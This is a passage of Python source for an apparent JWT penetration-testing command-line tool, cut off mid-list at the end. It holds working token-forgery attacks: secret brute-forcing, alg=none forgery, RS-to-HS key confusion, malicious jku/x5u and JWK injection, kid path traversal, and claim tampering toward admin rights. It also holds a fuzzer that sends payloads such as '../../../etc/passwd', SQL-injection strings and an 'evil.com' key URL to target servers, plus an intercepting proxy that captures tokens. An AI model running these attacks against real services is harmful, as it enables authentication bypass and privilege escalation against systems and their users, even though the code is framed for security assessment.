                # Print analysis summary
                severity_color = "red" if analysis["risk_rating"] in ("Critical", "High") else \
                                "yellow" if analysis["risk_rating"] == "Medium" else \
                                "green"
                console.print(f"[bold]Risk Rating:[/bold] [{severity_color}]{analysis['risk_rating']}[/{severity_color}]")
                
                if analysis["issues"]:
                    console.print(f"[bold]Issues found:[/bold] {len(analysis['issues'])}")
                    for issue in analysis["issues"]:
                        issue_color = "red" if issue["severity"] == "Critical" else \
                                    "orange3" if issue["severity"] == "High" else \
                                    "yellow" if issue["severity"] == "Medium" else \
                                    "green"
                        console.print(f"[{issue_color}]• {issue['severity']}:[/{issue_color}] {issue['description']}")
        except Exception as e:
            console.print(f"[red]Error analyzing token: {e}[/red]")
    
    if output_file and scan_results:
        # Save results to file
        output = {
            "url": url,
            "scan_time": datetime.datetime.now().isoformat(),
            "token_count": len(found_tokens),
            "results": scan_results
        }
        
        file_path = save_output_to_file(json.dumps(output, indent=2), "scan", "json")

# ────────────────────────────  CLI – ACTIVE  (CORE)  ────────────────────────
@app.command(help="Brute-force HS256 / 384 / 512 secret (CPU/GPU).")
def crack(token: str = typer.Option(...,"-t","--token",callback=validate_token),
          wordlist: Path = typer.Option(...,"-w","--wordlist",exists=True,readable=True),
          jobs: int = typer.Option(CPU_COUNT,"-j","--jobs"),
          gpu: bool = typer.Option(False,"--gpu"),
          active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Add --active to confirm exploitation intent")
    hs_bruteforce(token,wordlist,jobs,gpu)

@app.command(help="Forge 'alg=none' version of a JWT.")
def none(token: str = typer.Option(...,"-t","--token",callback=validate_token),
         active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forgery")
    hdr,pl,_=parse_jwt(token)
    forged = forge_none(hdr,pl)
    console.print(forged)
    
    # Test the token if URL is provided
    if current_session.target_url:
        test = typer.confirm("Do you want to test this token against the target?", default=False)
        if test:
            loc = typer.prompt("Where to place the token? (header/cookie/query/body)", default="header")
            method = typer.prompt("HTTP method? (GET/POST)", default="GET")
            response = send_token_request(
                current_session.target_url, 
                forged, 
                location=loc,
                additional_headers=current_session.headers,
                method=method
            )
            if response:
                console.print(f"[bold]Status Code:[/bold] {response.status_code}")
                console.print(f"[bold]Response Headers:[/bold]")
                for key, value in response.headers.items():
                    console.print(f"  {key}: {value}")
                
                # Try to determine if attack was successful
                if response.status_code < 400:
                    current_session.add_finding(
                        title="Successful alg=none Attack", 
                        description="Server accepted token with alg=none",
                        severity="Critical",
                        token=forged,
                        details={"status_code": response.status_code}
                    )
                    console.print("[bold green]Attack appears successful![/bold green]")

@app.command(help="RS/ES/PS → HS key-confusion (pubkey as HMAC secret).")
def confuse(token: str = typer.Option(...,"-t","--token",callback=validate_token),
            pubkey: Optional[Path] = typer.Option(None,"--pubkey",exists=True,readable=True,
                                                 help="Use this pubkey instead of generating one"),
            active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    
    pubkey_data = None
    if pubkey:
        pubkey_data = pubkey.read_text()
    
    key_confusion(token, pubkey_data)

@app.command(help="Inject malicious jku/x5u that points to local JWKS server.")
def jku(token: str = typer.Option(...,"-t","--token",callback=validate_token),
        which: str = typer.Option("both","--which", help="jku|x5u|both"),
        bind: str = typer.Option("127.0.0.1", "--bind", help="IP to bind server to"),
        https: bool = typer.Option(False, "--https", help="Use HTTPS for JWKS server"),
        active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    hdr,pl,_=parse_jwt(token)
    jku_inject(hdr, pl, which, bind_addr=bind, https=https)

@app.command(help="Create token with duplicate claim (default: exp).")
def duplicate(token: str = typer.Option(...,"-t","--token",callback=validate_token),
              claim: str = typer.Option("exp","--claim"),
              active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forgery")
    hdr,pl,_=parse_jwt(token); 
    forged = duplicate_claim(hdr,pl,claim)
    console.print(forged)

@app.command(help="Inject unknown 'crit' header.")
def crit(token: str = typer.Option(...,"-t","--token",callback=validate_token),
         active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for token forging")
    hdr,pl,_=parse_jwt(token)
    forged = crit_header(hdr,pl)
    console.print(forged)

@app.command(help="(Re)-sign a token with EdDSA (Ed25519) or ES256K.")
def sign(token: str = typer.Option(...,"-t","--token",callback=validate_token),
         keyfile: Optional[Path] = typer.Option(None,"-k","--key",exists=True,readable=True),
         generate: bool = typer.Option(False,"--generate",help="Generate new keypair"),
         alg: str = typer.Option("EdDSA","-a","--alg",help="EdDSA | ES256K | RS256"),
         kid: Optional[str] = typer.Option(None,"--kid"),
         active: bool = typer.Option(False,"--active")):
    if not active: pretty_error("Need --active for signing")
    alg = alg.upper()
    valid_algs = ["EDDSA", "ES256K", "RS256"]
    if alg not in valid_algs: 
        pretty_error(f"alg must be one of: {', '.join(valid_algs)}")
    
    hdr,pl,_ = parse_jwt(token)
    hdr["alg"] = alg
    if kid: hdr["kid"] = kid
    
    key_data = None
    if generate:
        # Generate a new key based on algorithm
        if alg == "EDDSA":
            priv_key, pub_key = generate_ed25519_key()
            key_data = priv_key
            console.print("[green]Generated new Ed25519 key[/green]")
        elif alg == "ES256K":
            priv_key, pub_key = generate_ec_key("secp256k1")
            key_data = priv_key
            console.print("[green]Generated new ES256K key[/green]")
        elif alg == "RS256":
            priv_key, pub_key = generate_rsa_key()
            key_data = priv_key
            console.print("[green]Generated new RSA key[/green]")
            
        # Save keys to file
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        priv_file = Path(f"generated_key_{timestamp}.pem")
        pub_file = Path(f"generated_key_{timestamp}.pub")
        
        with open(priv_file, "wb") as f:
            f.write(priv_key)
        with open(pub_file, "wb") as f:
            f.write(pub_key)
            
        console.print(f"[green]Private key saved to:[/green] {priv_file}")
        console.print(f"[green]Public key saved to:[/green] {pub_file}")
    
    elif keyfile:
        key_data = keyfile.read_bytes()
    else:
        pretty_error("Either --key or --generate must be specified")
    
    try: 
        new_tok = jwt.encode(pl, key_data, algorithm=alg, headers=hdr)
        current_session.add_finding(
            title=f"JWT Re-Signing ({alg})", 
            description=f"Successfully signed token with {alg} algorithm",
            severity="Medium",
            token=new_tok,
            details={"algorithm": alg, "kid": kid}
        )
    except Exception as exc: 
        pretty_error(f"Signing failed – {exc}")
        
    console.print("[green]Signed token:[/green]")
    console.print(new_tok)

# ────────────────────────────────────────────────────────────────────────
#                        EXTRA  ATTACKS  
# ────────────────────────────────────────────────────────────────────────
def _need_active(flag: bool):
    if not flag:
        pretty_error("Need --active to run this attack")

# 1  KID header injection
def _kid_inject(hdr: Json, pl: Json, kid: str="evil") -> str:
    token = forge_none({**hdr, "kid": kid, "alg": "none"}, pl)
    current_session.add_finding(
        title="Kid Header Injection", 
        description=f"Created token with injected kid={kid}",
        severity="Medium",
        token=token,
        details={"kid": kid}
    )
    return token

# 2  Directory traversal via KID
def _kid_traversal(hdr: Json, pl: Json,
                   depth: int=8, fname: str="keys/secret.pem") -> str:
    kid_value = "../"*depth + fname
    token = _kid_inject(hdr, pl, kid_value)
    current_session.add_finding(
        title="Directory Traversal via KID", 
        description=f"Created token with path traversal attack in kid parameter",
        severity="High",
        token=token,
        details={"path": kid_value}
    )
    return token

# 3  Full JWKS key injection (oct / HS256)
def _jwks_key_inject(hdr: Json, pl: Json) -> str:
    # Generate a real secret instead of a hardcoded one
    secret = os.urandom(32)
    jwk = {"kty":"oct","k":b64url_encode(secret),"kid":"evil_oct","alg":"HS256"}
    hdr2 = {**hdr,"jwk":jwk,"kid":"evil_oct","alg":"HS256"}
    token = forge_hs(hdr2, pl, secret.decode('latin1'))
    current_session.add_finding(
        title="JWK Key Injection", 
        description="Injected custom JWK key in header",
        severity="High",
        token=token,
        details={"kid": "evil_oct"}
    )
    return token

# 4  Public-key substitution (advanced JKU abuse)
def _jku_pubkey_sub(hdr: Json, pl: Json):
    # Generate a real RSA key
    key = rsa.generate_private_key(
        public_exponent=0x10001, 
        key_size=2048,
        backend=default_backend()
    )
    priv_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    nums = key.public_key().public_numbers()
    n = b64url_encode(nums.n.to_bytes((nums.n.bit_length()+7)//8,"big"))
    e = b64url_encode(nums.e.to_bytes((nums.e.bit_length()+7)//8,"big"))
    kid = "adv_rsa"
    global JWKS_JSON
    JWKS_JSON = json.dumps({"keys":[{"kty":"RSA","kid":kid,"alg":"RS256","n":n,"e":e}]})
    url = _serve_jwks()
    hdr2 = {**hdr,"alg":"RS256","kid":kid,"jku":url}
    tok = jwt.encode(pl, priv_pem, algorithm="RS256", headers=hdr2)
    
    current_session.add_finding(
        title="JKU Public Key Substitution", 
        description="Successfully set up JKU attack with custom generated keys",
        severity="Critical",
        token=tok,
        details={"url": url, "kid": kid}
    )
    
    return tok, priv_pem.decode(), url

# 5  Nested JWT
def _nested_jwt(hdr: Json, pl: Json):
    inner = forge_none({"alg":"none"}, {**pl, "nested":True})
    token = forge_none({**hdr,"alg":"none","cty":"application/jwt"}, {"jwt":inner})
    current_session.add_finding(
        title="Nested JWT Attack", 
        description="Created nested JWT with inner token using alg=none",
        severity="High",
        token=token,
        details={"content_type": "application/jwt"}
    )
    return token

# 6  Nested JWT + none-downgrade
def _nested_none_downgrade(hdr: Json, pl: Json):
    inner = forge_none(hdr, pl)
    token = forge_none({"alg":"none","cty":"JWT"}, {"jwt":inner})
    current_session.add_finding(
        title="Nested JWT Downgrade", 
        description="Created nested JWT with algorithm downgrade",
        severity="High",
        token=token
    )
    return token

# 7  Weak key generation (short RSA)
def _weak_key(hdr: Json, pl: Json, bits: int=512):
    key = rsa.generate_private_key(
        public_exponent=0x10001, 
        key_size=bits,
        backend=default_backend()
    )
    priv = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    tok = jwt.encode(pl, priv, algorithm="RS256", headers={**hdr,"alg":"RS256","weak":True})
    current_session.add_finding(
        title="Weak RSA Key Generation", 
        description=f"Created token signed with weak {bits}-bit RSA key",
        severity="High",
        token=tok,
        details={"bits": bits}
    )
    return tok, priv.decode()

# 8  JWK URL rewrite attack
def _jwk_url_rewrite(hdr: Json, pl: Json):
    # Use a real secret
    secret = os.urandom(16)
    jwk = {"kty":"oct","k":b64url_encode(secret),"kid":"rewrite","alg":"HS256"}
    url = _serve_jwks()
    hdr2 = {**hdr,"alg":"HS256","kid":"rewrite","jku":url,"jwk":jwk}
    token = forge_hs(hdr2, pl, secret.decode('latin1'))
    current_session.add_finding(
        title="JWK URL Rewrite Attack", 
        description="Created token with both JKU and direct JWK to confuse verifiers",
        severity="High",
        token=token,
        details={"url": url, "kid": "rewrite"}
    )
    return token

# 9  Key-confusion advanced (RS→HS offline)
def _key_confusion_adv(tok: str):
    hdr, pl, _ = parse_jwt(tok)
    if hdr.get("alg","").upper() != "RS256":
        console.print("[yellow]Token is not RS256 – skipping[/yellow]")
        return None
    # Generate a random secret that would be more realistic
    secret = os.urandom(32).hex()
    token = forge_hs({**hdr,"alg":"HS256"}, pl, secret)
    current_session.add_finding(
        title="Advanced Key Confusion", 
        description="RS256→HS256 key confusion with custom generated secret",
        severity="High",
        token=token,
        details={"original_alg": "RS256"}
    )
    return token

#10  Audience bypass
def _aud_bypass(hdr: Json, pl: Json, wrong: str="wrong_aud"):
    new_pl = pl.copy()
    if "aud" in new_pl:
        if isinstance(new_pl["aud"], list):
            new_pl["aud"].append(wrong)
        else:
            new_pl["aud"] = [new_pl["aud"], wrong]
    else:
        new_pl["aud"] = wrong
    token = forge_none(hdr, new_pl)
    current_session.add_finding(
        title="Audience Bypass Attack", 
        description="Created token with modified audience claim",
        severity="Medium",
        token=token,
        details={"added_audience": wrong}
    )
    return token

# ────────────────────────────────────────────────────────────────────────
#              NEW  ATTACKS  
# ────────────────────────────────────────────────────────────────────────
# 1  Issuer claim manipulation / duplication
def _issuer_manipulation(h: Json, p: Json, new_iss: str = "https://evil.example"):
    p2 = p.copy()
    if "iss" in p2:                      # keep original under different name
        p2["issuer"] = p2["iss"]
    p2["iss"] = new_iss
    token = forge_none(h, p2)
    current_session.add_finding(
        title="Issuer Claim Manipulation", 
        description="Modified issuer claim while preserving original value",
        severity="Medium",
        token=token,
        details={"new_issuer": new_iss}
    )
    return token

# 2  Critical-claims confusion (declare 'exp' critical but wrong type)
def _crit_claims_confusion(h: Json, p: Json):
    p2 = p.copy(); p2["exp"] = "never"   # string instead of int
    h2 = {**h, "crit": ["exp"], "alg": "none"}
    token = forge_none(h2, p2)
    current_session.add_finding(
        title="Critical Claims Type Confusion", 
        description="Declared exp as critical while using incorrect type",
        severity="High",
        token=token,
        details={"critical_claims": ["exp"]}
    )
    return token

# 3  Typo-claims attack (exp → expp, nbf → nbff, aud → audd)
def _typo_claims(h: Json, p: Json):
    p2 = p.copy()
    if "exp" in p2: p2["expp"] = p2.pop("exp")
    if "nbf" in p2: p2["nbff"] = p2.pop("nbf")
    if "aud" in p2: p2["audd"] = p2.pop("aud")
    token = forge_none(h, p2)
    current_session.add_finding(
        title="Typo Claims Attack", 
        description="Created token with misspelled standard claims",
        severity="Medium",
        token=token,
        details={"modified_claims": ["exp → expp", "nbf → nbff", "aud → audd"]}
    )
    return token

# 4  Signed-then-encrypted JWT attack (cheap JWE wrapper)
def _signed_then_encrypted(h: Json, p: Json, secret: str = "s3cret"):
    # Generate a secure secret if none provided
    if secret == "s3cret":
        secret = os.urandom(32).hex()
    
    inner_jws = forge_hs({**h, "alg": "HS256"}, p, secret)
    jwe_hdr = {"alg": "dir", "enc": "A128CBC-HS256", "cty": "JWT"}
    parts = [
        b64url_encode(json.dumps(jwe_hdr).encode()),
        "", "",                               # encrypted_key, iv
        b64url_encode(inner_jws.encode()),    # ciphertext
        ""                                    # auth tag
    ]
    token = ".".join(parts)
    current_session.add_finding(
        title="JWE Wrapping Attack", 
        description="Created pseudo-encrypted JWE with inner JWS token",
        severity="High", 
        token=token,
        details={"outer_alg": "dir", "enc": "A128CBC-HS256"}
    )
    return token

# 5  nbf manipulation (epoch-0 or far future)
def _nbf_manipulation(h: Json, p: Json, when: str = "past"):
    p2 = p.copy()
    p2["nbf"] = 0 if when == "past" else int(time.time()) + 10**7
    token = forge_none(h, p2)
    current_session.add_finding(
        title="NBF Manipulation", 
        description=f"Modified nbf claim to {'the past (epoch 0)' if when == 'past' else 'far future'}",
        severity="Medium",
        token=token,
        details={"nbf_value": p2["nbf"]}
    )
    return token

# 6  Replay attack with modified timestamp (iat shift)
def _replay_mod_ts(h: Json, p: Json, seconds: int = -3600):
    p2 = p.copy(); p2["iat"] = int(time.time()) + seconds
    token = forge_none(h, p2)
    current_session.add_finding(
        title="Timestamp Manipulation", 
        description=f"Modified iat claim to {seconds} seconds {'ago' if seconds < 0 else 'in the future'}",
        severity="Medium",
        token=token,
        details={"iat_shift": seconds}
    )
    return token

# 7  Typo in algorithm name confusion ("RS256 " etc.)
def _alg_typo_confusion(h: Json, p: Json):
    h2 = {**h, "alg": (h.get("alg", "RS256") + " ").rstrip() + " "}
    token = forge_none(h2, p)
    current_session.add_finding(
        title="Algorithm Name Typo Confusion", 
        description="Created token with whitespace in algorithm name",
        severity="Medium",
        token=token,
        details={"algorithm": h2["alg"]}
    )
    return token

# 8  Compression flag confusion (zip=DEF without compression)
def _zip_def_confusion(h: Json, p: Json):
    h2 = {**h, "zip": "DEF", "alg": "none"}
    token = forge_none(h2, p)
    current_session.add_finding(
        title="Compression Flag Confusion", 
        description="Added zip:DEF header without actual compression",
        severity="Medium",
        token=token,
        details={"zip": "DEF"}
    )
    return token

# 9  Mix-and-match nested JWE/JWS confusion
def _nest_mix_confusion(h: Json, p: Json, secret: str = "k"):
    # Use a better secret if the default is specified
    if secret == "k":
        secret = os.urandom(16).hex()
    
    inner = forge_none({"alg": "none"}, {**p, "lvl": 1})
    mid   = forge_hs({"alg": "HS256"}, {"jwt": inner, "lvl": 2}, secret)
    jwe_hdr = {"alg": "dir", "enc": "A128GCM", "cty": "JWT"}
    outer = ".".join([b64url_encode(json.dumps(jwe_hdr).encode()), "", "",
                      b64url_encode(mid.encode()), ""])
    
    current_session.add_finding(
        title="Nested JWE/JWS Mix Confusion", 
        description="Created deeply nested token with mixed JWE/JWS types",
        severity="High",
        token=outer,
        details={"levels": 3, "outer_type": "JWE", "middle_type": "JWS", "inner_type": "JWS"}
    )
    
    return outer

# ───────────────────────── ADVANCED PENTESTING FEATURES ───────────────────────
class ProxyServer:
    """JWT-aware HTTP proxy server for testing JWT attacks in real-time"""
    def __init__(self, host='127.0.0.1', port=8080):
        self.host = host
        self.port = port
        self.server = None
        self.server_thread = None
        self.tokens_seen = set()
        self.active = False
        
    def start(self):
        import socketserver
        from http.server import BaseHTTPRequestHandler
        
        proxy_instance = self
        
        class ProxyHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                self._handle_request('GET')
                
            def do_POST(self):
                self._handle_request('POST')
                
            def do_OPTIONS(self):
                self._handle_request('OPTIONS')
                
            def _handle_request(self, method):
                # Get request details
                url = self.path
                headers = {k: v for k, v in self.headers.items()}
                
                # Extract any tokens from headers or cookies
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ""
                
                # Combine all request data for token extraction
                all_data = url + " " + str(headers) + " " + body
                tokens = extract_tokens_from_request(all_data)
                
                # Process found tokens
                for token in tokens:
                    if token not in proxy_instance.tokens_seen:
                        proxy_instance.tokens_seen.add(token)
                        console.print(f"[green]Found new JWT token in request:[/green]")
                        try:
                            hdr, pl, sig = parse_jwt(token)
                            pretty_print(hdr, pl, sig)
                            
                            # Add to session
                            current_session.add_token(token, token, "captured")
                        except:
                            console.print("[yellow]Invalid JWT format[/yellow]")
                
                # Forward the request to the actual server
                try:
                    target_url = url if url.startswith('http') else f"http://{self.headers.get('Host', 'localhost')}{url}"
                    content_length = int(self.headers.get('Content-Length', 0))
                    request_body = self.rfile.read(content_length) if content_length > 0 else None
                    
                    import requests
                    resp = requests.request(
                        method=method,
                        url=target_url,
                        headers={k: v for k, v in self.headers.items() if k.lower() != 'host'},
                        data=request_body,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    # Send the response back to client
                    self.send_response(resp.status_code)
                    for k, v in resp.headers.items():
                        self.send_header(k, v)
                    self.end_headers()
                    self.wfile.write(resp.content)
                    
                    # Extract tokens from response
                    resp_data = str(resp.headers) + " " + resp.text
                    resp_tokens = extract_tokens_from_request(resp_data)
                    for token in resp_tokens:
                        if token not in proxy_instance.tokens_seen:
                            proxy_instance.tokens_seen.add(token)
                            console.print(f"[cyan]Found new JWT token in response:[/cyan]")
                            try:
                                hdr, pl, sig = parse_jwt(token)
                                pretty_print(hdr, pl, sig)
                                
                                # Add to session
                                current_session.add_token(token, token, "captured")
                            except:
                                console.print("[yellow]Invalid JWT format[/yellow]")
                                
                except Exception as e:
                    console.print(f"[red]Proxy error: {e}[/red]")
                    self.send_response(502)
                    self.end_headers()
                    self.wfile.write(f"Proxy Error: {str(e)}".encode())
                    
        class ThreadedHTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
            allow_reuse_address = True
        
        self.server = ThreadedHTTPServer((self.host, self.port), ProxyHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()
        self.active = True
        console.print(f"[green]Proxy server started on http://{self.host}:{self.port}[/green]")
        console.print("[cyan]Configure your browser to use this proxy to capture JWT tokens[/cyan]")
        
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.active = False
            console.print("[yellow]Proxy server stopped[/yellow]")

def generate_report():
    """Generate a comprehensive security report from the current session"""
    if not current_session.findings:
        console.print("[yellow]No findings to report. Run attacks first.[/yellow]")
        return None
    
    # Count findings by severity
    severity_counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
    for finding in current_session.findings:
        severity_counts[finding.get('severity', 'Info')] += 1
    
    report = {
        "title": "JWT Security Assessment Report",
        "date": datetime.datetime.now().isoformat(),
        "session_id": current_session.id,
        "target": current_session.target_url or "Unknown",
        "summary": {
            "total_findings": len(current_session.findings),
            "severity_breakdown": severity_counts,
            "tested_tokens": len(current_session.tokens)
        },
        "findings": current_session.findings,
        "tokens": {original: [t["token"] for t in tokens] 
                 for original, tokens in current_session.tokens.items()},
        "recommendations": [
            "Verify JWT signatures on the server side",
            "Do not accept 'none' algorithm",
            "Use strong keys for signature verification",
            "Validate all claims including exp, nbf, iss, aud",
            "Implement proper key management",
            "Add additional context validation beyond the token"
        ]
    }
    
    # Pretty format for console
    console.print(Panel(f"[bold]JWT Security Assessment Report[/bold]", style="cyan"))
    console.print(f"[bold]Date:[/bold] {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    console.print(f"[bold]Target:[/bold] {current_session.target_url or 'Unknown'}")
    console.print(f"[bold]Session ID:[/bold] {current_session.id}")
    
    console.print("\n[bold]Findings Summary:[/bold]")
    table = Table(show_header=True, header_style="bold")
    table.add_column("Severity")
    table.add_column("Count")
    
    for severity, count in severity_counts.items():
        color = "red" if severity == "Critical" else \
                "orange3" if severity == "High" else \
                "yellow" if severity == "Medium" else \
                "green" if severity == "Low" else \
                "blue"
        table.add_row(f"[{color}]{severity}[/{color}]", str(count))
    
    console.print(table)
    
    # Print high and critical findings
    high_findings = [f for f in current_session.findings 
                    if f.get('severity') in ('Critical', 'High')]
    
    if high_findings:
        console.print("\n[bold red]Critical & High Findings:[/bold red]")
        for i, finding in enumerate(high_findings, 1):
            console.print(f"[bold]{i}. {finding['title']}[/bold] - {finding['description']}")
    
    return report

# ────────────────────────── ADDITIONAL CLI COMMANDS ───────────────────────
@app.command(help="Fuzz JWT parameters to find parser weaknesses")
def fuzz(token: str = typer.Option(..., "-t", "--token", callback=validate_token),
         url: str = typer.Option(None, "--url", help="URL to test tokens against"),
         location: str = typer.Option("header", "--location", help="Where to place tokens: header,cookie,query"),
         headers: bool = typer.Option(True, "--headers/--no-headers", help="Fuzz header fields"),
         claims: bool = typer.Option(True, "--claims/--no-claims", help="Fuzz payload claims"),
         algorithms: bool = typer.Option(True, "--algorithms/--no-algorithms", help="Fuzz algorithms"),
         active: bool = typer.Option(False, "--active")):
    """
    Fuzz JWT parameters to find implementation weaknesses
    """
    if not active: pretty_error("Need --active for fuzzing tokens")
    
    hdr, pl, _ = parse_jwt(token)
    console.print("[cyan]Starting JWT fuzzing...[/cyan]")
    
    results = []
    forged_tokens = []
    
    # Prepare request function
    def test_token(token, description):
        if not url:
            return {"status": "skipped", "token": token, "description": description}
        
        try:
            response = send_token_request(url, token, location=location)
            return {
                "status": "success" if response.status_code < 400 else "rejected",
                "status_code": response.status_code,
                "token": token,
                "description": description
            }
        except Exception as e:
            return {"status": "error", "error": str(e), "token": token, "description": description}
    
    # 1. Algorithm fuzzing
    if algorithms:
        console.print("[cyan]Fuzzing algorithms...[/cyan]")
        alg_tests = [
            "none", "None", "NONE", "nOnE",  # Case variations
            "none ", " none", "none\t", "\tnone",  # Whitespace
            "HS256", "RS256", "ES256", "PS256",  # Common algorithms
            "HS256 ", "RS256\t",  # Algorithm with whitespace
            "null", "undefined",  # JS-like values
            "HS256\u0000", "HS256\n",  # Special characters
            "",  # Empty algorithm
            "INVALID_ALG",  # Invalid algorithm
        ]
        
        for alg in alg_tests:
            try:
                h2 = hdr.copy()
                h2["alg"] = alg
                h_b64 = b64url_encode(json.dumps(h2).encode())
                p_b64 = b64url_encode(json.dumps(pl).encode())
                tok = f"{h_b64}.{p_b64}."
                
                forged_tokens.append(tok)
                result = test_token(tok, f"Algorithm: {alg}")
                results.append(result)
                
                if result.get("status") == "success":
                    console.print(f"[bold green]Accepted: {alg}[/bold green]")
                    current_session.add_finding(
                        title=f"Algorithm '{alg}' Accepted", 
                        description=f"Server accepted token with algorithm '{alg}'",
                        severity="Critical" if alg.lower() == "none" else "High",
                        token=tok,
                        details={"algorithm": alg, "status_code": result.get("status_code")}
                    )
            except Exception as e:
                console.print(f"[yellow]Error testing algorithm '{alg}': {e}[/yellow]")
    
    # 2. Header fuzzing
    if headers:
        console.print("[cyan]Fuzzing header fields...[/cyan]")
        header_tests = [
            ("kid", "../../../etc/passwd"),
            ("kid", "1 OR 1=1"),
            ("kid", "' OR '1'='1"),
            ("kid", "null"),
            ("kid", ""),
            ("kid", "{{.BadTemplate}}"),
            ("typ", "JWT "),
            ("typ", ""),
            ("typ", "SOMETHING_ELSE"),
            ("crit", ["exp"]),
            ("crit", ["custom"]),
            ("crit", []),
            ("crit", "not_array"),
            ("x5u", "http://evil.com/keys.jwks"),
            ("jku", "http://evil.com/keys.jwks"),
            ("jwk", {"kty":"oct","k":"QQ==","alg":"HS256"}),
        ]
        
        for key, value in header_tests:
            try:
                h2 = {**hdr, key: value, "alg": "none"}
                h_b64 = b64url_encode(json.dumps(h2).encode())
                p_b64 = b64url_encode(json.dumps(pl).encode())
                tok = f"{h_b64}.{p_b64}."
                
                forged_tokens.append(tok)
                result = test_token(tok, f"Header: {key}={value}")
                results.append(result)
                
                if result.get("status") == "success":
                    console.print(f"[bold green]Accepted header: {key}={value}[/bold green]")
                    current_session.add_finding(
                        title=f"Vulnerable to {key} Injection", 
                        description=f"Server accepted token with {key}={value}",
                        severity="High",
                        token=tok,
                        details={"header": key, "value": str(value), "status_code": result.get("status_code")}
                    )
            except Exception as e:
                console.print(f"[yellow]Error testing header '{key}': {e}[/yellow]")
    
    # 3. Claim fuzzing
    if claims:
        console.print("[cyan]Fuzzing payload claims...[/cyan]")
        claim_tests = [
            ("exp", int(time.time()) - 3600),  # Expired
            ("exp", "never"),  # Wrong type
            ("exp", None),  # Null
            ("exp", int(time.time()) + 9999999),  # Far future
            ("nbf", int(time.time()) + 3600),  # Not yet valid
            ("nbf", 0),  # Epoch start
            ("iat", int(time.time()) + 3600),  # Future issuance
            ("aud", ["legitimate", "evil.com"]),  # Multiple audiences
            ("iss", "evil.com"),  # Wrong issuer
            ("sub", "admin"),  # Privilege escalation attempt
            ("role", "admin"),  # Common claim name for roles
            ("admin", True),  # Admin flag
            ("permissions", ["admin"]),  # Add admin permission
        ]
        
        for key, value in claim_tests:
            try:
                p2 = pl.copy()
                p2[key] = value
                h_b64 = b64url_encode(json.dumps({**hdr, "alg": "none"}).encode())
                p_b64 = b64url_encode(json.dumps(p2).encode())
                tok = f"{h_b64}.{p_b64}."
                
                forged_tokens.append(tok)
                result = test_token(tok, f"Claim: {key}={value}")
                results.append(result)
                
                if result.get("status") == "success":
                    console.print(f"[bold green]Accepted claim: {key}={value}[/bold green]")
                    current_session.add_finding(
                        title=f"Claim Manipulation Accepted", 
                        description=f"Server accepted token with manipulated {key} claim",
                        severity="High" if key in ("role", "admin", "permissions") else "Medium",
                        token=tok,
                        details={"claim": key, "value": str(value), "status_code": result.get("status_code")}
                    )
            except Exception as e:
                console.print(f"[yellow]Error testing claim '{key}': {e}[/yellow]")
    
    # Summary
    if url:
        accepted = sum(1 for r in results if r.get("status") == "success")
        console.print(f"\n[bold]Fuzzing Summary:[/bold]")
        console.print(f"Total tests: {len(results)}")
        console.print(f"Accepted tokens: [{'red' if accepted else 'green'}]{accepted}[/{'red' if accepted else 'green'}]")
        console.print(f"Rejected tokens: {len(results) - accepted}")
        
        if accepted > 0:
            console.print("[bold red]The application has JWT validation vulnerabilities![/bold red]")
    else:
        console.print(f"\n[bold]Generated {len(forged_tokens)} test tokens[/bold]")
        console.print("[yellow]Provide --url parameter to test these tokens against a target[/yellow]")
    
    # Save results to file
    if forged_tokens:
        tokens_str = "\n".join(forged_tokens)
        save_output_to_file(tokens_str, "fuzzing_tokens", "txt")
        
        if url and results:
            report_str = json.dumps(results, indent=2)
            save_output_to_file(report_str, "fuzzing_results", "json")
    
    return forged_tokens

@app.command(help="Run JWT-aware HTTP proxy to capture and analyze tokens")
def proxy(host: str = typer.Option("127.0.0.1", "--host", help="Proxy server host"),
          port: int = typer.Option(8080, "--port", help="Proxy server port"),
          active: bool = typer.Option(False, "--active")):
    """
    Start a JWT-aware HTTP proxy server to capture and analyze tokens in real-time
    """
    if not active: pretty_error("Need --active to run proxy server")
    
    # Create and start proxy server
    proxy_server = ProxyServer(host, port)
    
    try:
        proxy_server.start()
        console.print("\n[bold cyan]Press Ctrl+C to stop the proxy server[/bold cyan]")
        
        # Keep the main thread alive
        while proxy_server.active:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[yellow]Stopping proxy server...[/yellow]")
    finally:
        proxy_server.stop()
        
        if proxy_server.tokens_seen:
            console.print(f"\n[green]Captured {len(proxy_server.tokens_seen)} JWT tokens[/green]")
            
            # Save tokens to file
            tokens_str = "\n".join(proxy_server.tokens_seen)
            save_output_to_file(tokens_str, "captured_tokens", "txt")

@app.command(help="Brute force token placement in requests")
def bruteheaders(token: str = typer.Option(..., "-t", "--token", callback=validate_token),
                 url: str = typer.Option(..., "--url", help="URL to test against"),
                 method: str = typer.Option("GET", "--method", help="HTTP method"),
                 active: bool = typer.Option(False, "--active")):
    """
    Try different header and parameter placements to find where a JWT is accepted
    """
    if not active: pretty_error("Need --active for brute forcing token placement")
    
    console.print(f"[cyan]Testing token placement against {url}[/cyan]")
    
    # Common places to try the token
    placements = [
        {"type": "header", "name": "Authorization", "format": "Bearer {token}"},
        {"type": "header", "name": "Authorization", "format": "{token}"},
        {"type": "header", "name": "X-Access-Token", "format": "{token}"},
        {"type": "header", "name": "X-API-Key", "format": "{token}"},
        {"type": "header", "name": "X-Token", "format": "{token}"},
